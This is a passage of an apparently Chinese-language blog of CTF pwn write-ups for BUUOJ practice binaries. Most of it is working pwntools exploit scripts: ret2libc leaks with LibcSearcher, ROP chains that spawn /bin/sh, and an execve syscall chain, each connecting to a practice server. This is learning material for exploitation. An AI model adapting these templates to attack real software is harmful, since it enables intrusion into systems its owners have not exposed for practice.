class="hljs-number">28804</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;ice!\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)  <span class="hljs-comment">#class pwnlib.elf.elf.ELF(path, checksec=True)注意参数是路径,别忘了&quot;./&quot;</span><br>plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment">#                     x64机器压入参数     唯一一个参数     ret指令跳转到的地址  函数返回地址(重新到main)</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x58</span> + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;pted\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>addr = u64(p.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#我也不知道这是为啥</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, addr)<br>libc_base = addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment">#                     栈平衡           x64机器压入参数     唯一一个参数       ret指令跳转到的地址</span><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x58</span> + p64(ret_addr) + p64(rdipop_addr) + p64(binsh_addr) + p64(sys_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;ice!\n&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;ted\n&quot;</span>, payload)<br><br>p.interactive() <span class="hljs-comment">#将程序的输出输入流改为 标准输出输入流</span><br></code></pre></div></td></tr></table></figure><p>tips:</p><ul><li><p><code>payload = b&#39;b&#39;*0x58 + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</code></p><p>GOT顾名思义它只是一张表, 第一次链接后存放着函数的起始地址, plt表中使用 jmp *GOT[4], 即GOT表元素的引用, 第三个p64不能改为got_addr!!!!!!!!!!!!!</p></li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher用法.(就是某位国人写的小工具, 至于为啥是str_bin_sh我还不知道.......)</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span><br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>, <span class="hljs-number">0X7ff39014bd90</span>)<br>obj.dump(<span class="hljs-string">&quot;system&quot;</span>)        <span class="hljs-comment">#system 偏移</span><br>obj.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)    <span class="hljs-comment">#/bin/sh 偏移</span><br>obj.dump(<span class="hljs-string">&quot;__libc_start_main_ret&quot;</span>)    <br></code></pre></div></td></tr></table></figure><h2 id="3-PWN5-普通的格式化字符串漏洞"><a href="#3-PWN5-普通的格式化字符串漏洞" class="headerlink" title="3. PWN5(普通的格式化字符串漏洞)"></a>3. PWN5(普通的格式化字符串漏洞)</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtstr_payload</span>(<span class="hljs-params">offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>, write_size_max=<span class="hljs-string">&#x27;long&#x27;</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">                   overflows=<span class="hljs-number">16</span>, strategy=<span class="hljs-string">&quot;small&quot;</span>, badbytes=<span class="hljs-built_in">frozenset</span>(<span class="hljs-params"></span>), offset_bytes=<span class="hljs-number">0</span></span>):</span> → <span class="hljs-built_in">str</span><br><span class="hljs-string">&#x27;&#x27;&#x27;Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. </span><br><span class="hljs-string">The size of the addr is taken from context.bits</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>Parameters:<br>offset (<span class="hljs-built_in">int</span>) – the first formatter’s offset you control<br>writes (<span class="hljs-built_in">dict</span>) – <span class="hljs-built_in">dict</span> <span class="hljs-keyword">with</span> addr, value &#123;addr: value, addr2: value2&#125;<br>numbwritten (<span class="hljs-built_in">int</span>) – number of byte already written by the printf function<br>write_size (<span class="hljs-built_in">str</span>) – must be byte, short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>. Tells <span class="hljs-keyword">if</span> you want to write byte by byte, <br>short by short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span> by <span class="hljs-built_in">int</span> (hhn, hn <span class="hljs-keyword">or</span> n)<br>overflows (<span class="hljs-built_in">int</span>) – how many extra overflows (at size sz) to tolerate to reduce the length of <br>the <span class="hljs-built_in">format</span> string<br>strategy (<span class="hljs-built_in">str</span>) – either ‘fast’ <span class="hljs-keyword">or</span> ‘small’ (‘small’ <span class="hljs-keyword">is</span> default, ‘fast’ can be used <span class="hljs-keyword">if</span> there <br>                                                are many writes)<br>Returns:<br>The payload <span class="hljs-keyword">in</span> order to do needed writes<br></code></pre></div></td></tr></table></figure><h2 id="4-BabyRop-0"><a href="#4-BabyRop-0" class="headerlink" title="4. BabyRop[0]."></a>4. BabyRop<a href="https://blog.csdn.net/weixin_44677409/article/details/113769436">[0]</a>.</h2><p>查看程序的保护机制<img src="https://i.loli.net/2021/07/22/Ri6VUFBHCIbNpmj.png" alt="image-20210722002115059"> </p><p>发现是got表不可写的32位程序<br>拖进ida查看伪代码<img src="https://i.loli.net/2021/07/22/18Yp72mcR5gDEoV.png" alt="image-20210722002553447"> </p><p>sub_80486BB是初始化缓存区的函数<br>发现buf是一个随机数<img src="https://i.loli.net/2021/07/22/k7LqQlvpzZsFEry.png" alt="image-20210722002240287"> </p><p>发现函数中存在strncmp比较函数，其中buf为用户输入的值，s为buf随机数，如果不相等则会退出程序，<u>所以需要想办法绕过这个判断，所以v1的值必须为0</u>.</p><p>v1 = strlen(buf),strlen这个函数有个<strong>缺陷</strong>：遇到\x00直接截断。所以我们要输入第一位数为\x00</p><p>buf被IDA识别为32位数组, 函数返回值是buf[7], 所以直接将buf[7]写成想要的数值即可</p><p>接下来来看最后一个函数<img src="https://i.loli.net/2021/07/22/l6dPBCuI5vsyKNL.png" alt="image-20210722002708919"> </p><p>其中a1即为上文中的v5，假如a1等于127则会执行第一条语句，不会溢出，当a1大于0xE7时就会存在溢出，从而覆盖返回地址</p><p>解题思路：首先通过\x00来绕过判断，覆盖v5为\xff（使得v5尽可能的大），通过wirte函数来泄露write的内存地址，然后利用libc来计算system函数地址，最后利用溢出使得返回地址为system</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28361</span>)<br><span class="hljs-comment">#ignore the strncmp and overwrite buf[7] to the max\xff</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br><span class="hljs-comment">#jump to read(0, buf, a1) and char buf[231]</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>)<br><span class="hljs-comment">#leak the write_addr</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop&quot;</span>, <span class="hljs-number">0</span>)<br>got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x8048825</span><br><br>payload = payload + p32(plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#payload = flat([b&#x27;a&#x27;*(0xe7+0x4), plt, main, 1, got, 4])</span><br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#calc the sys_addr and returned to the main function </span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>, <span class="hljs-number">0</span>)<br>sys_libc = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>write_libc = libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>binsh_libc  = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>libc_base = write_addr - write_libc<br>sys = libc_base + sys_libc<br>binsh = libc_base + binsh_libc<br><br><span class="hljs-comment">#constrct the payload</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh])<br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>tips:</strong>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#新用法get:</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>sla=<span class="hljs-keyword">lambda</span> x,y:io.sendlineafter(x,y)<br>rl=<span class="hljs-keyword">lambda</span> :io.recvline()<br>ru=<span class="hljs-keyword">lambda</span> x:io.recvuntil(x)<br></code></pre></div></td></tr></table></figure><ul><li><p>strlen()函数遇到’\0’就会停止!!!!!!</p></li><li><p>别忘了先是<strong>参数</strong>后是sys的<strong>返回地址</strong>.</p></li><li><p>pack():   Word-size, endianness and signedness is done according to context</p><p>所以, flat()中的wordsize就不用管了, 自动使用相应的pack()函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pwnlib.util.packing.flat(*a, **kw)<br>- flat(*args, preprocessor = <span class="hljs-literal">None</span>, length = <span class="hljs-literal">None</span>, filler = de_bruijn(), <span class="hljs-comment">#???debruijn是个什么东西</span><br>  word_size = <span class="hljs-literal">None</span>, endianness = <span class="hljs-literal">None</span>, sign = <span class="hljs-literal">None</span>) -&gt; <span class="hljs-built_in">str</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="6-ciscn-2019-n-8"><a href="#6-ciscn-2019-n-8" class="headerlink" title="6.ciscn_2019_n_8"></a>6.ciscn_2019_n_8</h2><ul><li>三种方法一应俱全<a href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</li><li>还是看别人的才做的出来, 不然谁会知道:<ul><li>get_flag的返回地址不能乱写，打远程时，如果程序是异常退出了，最后是不给你回显的. </li><li>正常退出需要使用exit(), 所以将get_flag的返回地址写成exit的地址</li><li>如果正常退出, 你不加一个p.recv()接受字符, 仍然没有回显.</li><li>还有就是修改bss段的权限, 高级操作, 又得学一个函数**(还没学)**.</li></ul></li></ul><h2 id="7-not-the-same"><a href="#7-not-the-same" class="headerlink" title="7.not_the_same"></a>7.not_the_same</h2><ul><li>简单的栈溢出题目, 就不截图了, 和第六题是一样的, 需要注意exit正常退出程序后必须recv几个字符远程才会有输出</li><li>可以看到我做了一个万能头, 以后写exp只要复制修改一下就可以了, 还是挺方便的</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26867</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#整理以下思路：45个数组先覆盖掉，然后是get_secrt地址，然后是write地址，</span><br><span class="hljs-comment">#write的返回地址（感觉得是exit的地址），第一个参数1，第二个0x80ECA2D，第三个50字节（就这么长)</span><br><span class="hljs-comment">#还是printf函数的参数简单一点</span><br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>, <span class="hljs-number">0</span>)<br>exit = elf.symbols[<span class="hljs-string">&quot;exit&quot;</span>]<br><span class="hljs-comment">#write = elf.symbols[&quot;write&quot;]</span><br>printf = elf.symbols[<span class="hljs-string">&quot;printf&quot;</span>]<br>get = elf.symbols[<span class="hljs-string">&quot;get_secret&quot;</span>]<br>buf = <span class="hljs-number">0x80ECA2D</span><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">45</span>, get, printf, exit, buf])<br>sl(payload)<br>ra()<br></code></pre></div></td></tr></table></figure><h2 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8.bjdctf_2020_babystack"></a>8.bjdctf_2020_babystack</h2><ul><li>比较简单, 主要的问题是context的默认bit是32, 换成万能头的context.binary就没有问题了</li></ul><h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>过程<a href="https://www.freesion.com/article/93161361727/">[0]</a>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28273</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br><span class="hljs-comment">#思路：先addlog写入128字节的src，下一次循环到getfalg里面用strcpy写入dest实现溢出，返回地址sys，sys返回地址随意，sys参数为sh地址</span><br>elf = ELF(<span class="hljs-string">b&quot;./ciscn_2019_ne_5&quot;</span>, <span class="hljs-number">0</span>)<br>sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh&quot;</span>))<span class="hljs-comment">#可以直接用ELF.search, 或者ROPgadget --binary &quot;&quot; --string &quot;&quot;</span><br>sys = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, sh])<br><span class="hljs-comment">#sla(b&#x27;password:&#x27;, b&#x27;administrator&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;1&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;info:&#x27;, payload)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;4&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<span class="hljs-comment">#只要搞得清楚, 直接只用sendline(), 只是调试有点乱而已(也还好, 现在的输入也不会太多)</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(payload)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#sl(b&#x27;administrator\n1\n&#x27;+payload+b&#x27;\n4&#x27;)甚至可以写成</span><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10. others_shellcode_"></a>10. others_shellcode_</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__asm &#123; <span class="hljs-keyword">int</span> <span class="hljs-number">80</span>h; LINUX - sys_execve &#125; <span class="hljs-comment">//tmd这又是哪门子的LINUX</span><br></code></pre></div></td></tr></table></figure><p>p.s. 关于__asm <a href="https://docs.microsoft.com/en-us/cpp/assembler/inline/asm?view=msvc-160">[0]</a>.</p><p>之前刷题中用到的后门函数都是system(“/bin/sh”)，这次出现了一个新的后门：**execve()**。</p><p>函数定义:<br>**int execve(const char *filename, char <em>const argv[ ], char <em>const envp[ ]);</em></em> </p><p>寄存器eax放execve的系统调用号11；<br>寄存器ebx放文件路径，即第一个参数；<br>寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；<br>寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。</p><p><strong>后两个参数一般为0</strong> </p><p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。如果没有/bin/sh字符串, 那么就先调用read函数读取”/bin/sh”, 尝试”sh”失败, 原因尚未知晓</p><h2 id="11-2018-rop"><a href="#11-2018-rop" class="headerlink" title="11.2018_rop"></a>11.2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">setresuid(); <br>setresgid();<br><span class="hljs-comment">//These two syscalls are like their equivalent kernels calls above, but with the additional ability to set the Saved-User-ID (SUID) or Saved-Group-ID (SGID). re represent</span><br></code></pre></div></td></tr></table></figure><h2 id="12-ciscn-s-3"><a href="#12-ciscn-s-3" class="headerlink" title="12.ciscn_s_3"></a>12.ciscn_s_3</h2><ol><li><p>checksec</p><p><img src="https://i.loli.net/2021/08/06/Exk1cpHYvmls4fJ.png" alt="image-20210806154145249"></p></li><li><p>main函数里面只有vuln, vuln函数里就是简单的sysread syswrite, 都是通过syscall以及系统调用号来执行的</p><img src="https://i.loli.net/2021/08/06/SP7dTJbw4XCQBDm.png" alt="image-20210806154501028" style="zoom:80%;" /> <p>gadgets函数:</p><img src="https://i.loli.net/2021/08/06/OiYpf1UhETLPwo5.png" alt="image-20210806154658559" style="zoom:80%;" /> </li><li><p>最重要的两点</p><ul><li>这两个函数<strong>都不以leave结尾</strong>, 意味着函数结束后没有恢复到之前的栈帧, 进入函数时的ebp的位置即为返回地址, 所以IDA中栈分析是错误的, <strong>真实栈结构还得看汇编代码</strong> </li><li><strong>第一种办法:</strong> 看见了一个mov rax, <strong>3B</strong>h    retn, 代表着我们可以利用这两行代码为执行sys_execve做准备</li><li><strong>第二种办法:SROP</strong> </li><li>下面先用第一种方法.</li></ul></li><li><p>从反汇编代码中看出sys_read几乎无限长字节(0x400), sys_write30个单位, 有明显的栈溢出, 这里我们使用59号系统调用(64位), 构造</p><p><code>execve(&#39;/bin/sh&#39;，0，0）</code> </p><p>但是程序中并未发现/bin/sh, 所以需要手动输入, 新问题是sys_read后<strong>我们的字符串</strong>在什么地址上? 所以需要<strong>leak</strong>出某一个有用的地址</p></li><li><p>gdb调试:</p><p>b vuln-&gt;run-&gt;continue-&gt; aaaaaaaaa(测试输入)-&gt;发现栈的<u>基地址</u> </p><ul><li><p>不得不说的就是这个<strong>栈的基地址</strong>, 一般是main函数参数中argv[0]即文件的路径, gdb中会写成这个样子</p><p> <code>0xffffd0ec —▸ 0xffffd204 —▸ 0xffffd3c4 ◂— &#39;/root/Desktop/fm&#39;</code> </p><p> 取第一次解引用的地址即为栈的基地址, 减去rsp得到<strong>0x118</strong> </p><p> 栈的基地址长这样子, 有path的那条就是, 下面一大串的是环境变量envp</p> <img src="https://i.loli.net/2021/08/06/R2XcmJiCe7lG3Lo.png" alt="image-20210806235944050" style="zoom: 80%;" /> </li></ul></li><li><p><strong>要注意的是,</strong> pop指令弹出的是栈上指针对应地址的数据, 平时栈溢出填充的很容易以为直接就是数据, 实际上在这种情况下应该写成一个地址, 指向payload中后面的参数, 如下sh+0x50指向mov_rax</p><p><img src="https://i.loli.net/2021/08/07/j9ZSDorqgbEfGvy.png"> </p></li><li><p>详细注释:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import*</span><br>context.binary = <span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span><br>context.log_level= <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>rn=<span class="hljs-keyword">lambda</span> x:io.recv (x)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, xxxxx)<br>vuln=<span class="hljs-number">0x4004ed</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>csu_end=<span class="hljs-number">0x40059a</span><br>csu_front=<span class="hljs-number">0x400580</span><br>mov_rax=<span class="hljs-number">0x4004e2</span><br>syscall=<span class="hljs-number">0x400517</span><br><span class="hljs-comment">#第一次的目的是leak基地址, 填上数组的16字节即可, 返回地址继续回到vuln</span><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(vuln)<br>sl(payload)<br>rn(<span class="hljs-number">0x20</span>)<br>binsh=u64(rn(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-comment">#        输入binsh     填完数组  即csuend      即mov_rax地址   rbx,rbp填为0    r13-r15全为0</span><br>payload= <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>+ p64(<span class="hljs-number">0</span>)+  p64(csu_end)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+      p64(binsh+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br><span class="hljs-comment">#即csufront     ROPgadget    execve首参数  mov系统调用号   最后syscall59执行execve   </span><br>+p64(csu_front)+p64(pop_rdi)+p64(binsh)+  p64(mov_rax)+  p64(syscall) <br><br>sl(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p> <strong>附: SROP<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">[CTF-WiKi]</a></strong> <strong>[<a href="https://blog.csdn.net/qinying001/article/details/104291387">writeup</a>]</strong> </p><ul><li><p>简单说来SROP就是调用sigreturn函数改写所有寄存器的值, 然后再执行rip指向的地址</p><p>本题中流程为: 泄露栈基地址-&gt;构造frame = SigreturnFrame()-&gt;填满数组, mov调用号15, syscall地址, bytes(frame)</p></li></ul><h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>看了老半天源代码和基础知识</p><p>估摸着我得过几天复习复习, 可不能忘记了</p><p><a 